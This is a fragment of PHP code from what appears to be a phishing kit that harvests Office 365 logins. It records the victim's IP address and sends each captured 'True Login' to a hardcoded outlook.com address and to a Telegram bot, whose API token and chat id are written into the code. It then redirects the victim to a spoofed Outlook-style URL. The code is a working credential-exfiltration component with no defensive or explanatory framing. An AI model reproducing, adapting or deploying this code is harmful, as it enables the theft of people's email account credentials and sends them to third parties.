...
$recipient = 'juniorss122s@outlook.com'; // Put your email address here
...
$ip = getenv("REMOTE_ADDR");
	...
	if ($result == 1)
		...
		$message.= "-----------------+ Created in burhan+------------------\n";
		$subject = "OFFICE 365 | True Login: " . $ip . "\n";
		$headers = "MIME-Version: 1.0\n";
        $apiToken = "1145141538:AAGJ3csB6B7G8UntMcAF947858g4HhpqWOk";
		...
		header("Location: index.php?error&id=$user&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
			...
			$officebot = [
	    'chat_id' => '@KUO65Rgb4fGOs7sdnph6zg',
	    'text' => $message
	];
	/*
function message(){
